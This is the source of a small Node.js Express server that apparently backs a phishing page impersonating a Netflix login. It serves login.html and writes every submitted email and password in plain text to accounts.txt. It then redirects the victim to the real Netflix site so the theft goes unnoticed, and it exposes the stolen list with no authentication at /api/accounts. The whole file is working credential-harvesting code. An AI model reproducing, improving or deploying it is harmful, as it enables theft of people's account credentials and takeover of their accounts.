const fs = require('fs');
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const entry = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile(path.join(__dirname, 'accounts.txt'), entry, err => {
        // Ignore errors for now, just redirect to Netflix
        res.redirect('https://www.netflix.com/ph-en/');
    });
});

app.get('/api/accounts', (req, res) => {
    res.sendFile(path.join(__dirname, 'accounts.txt'));
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});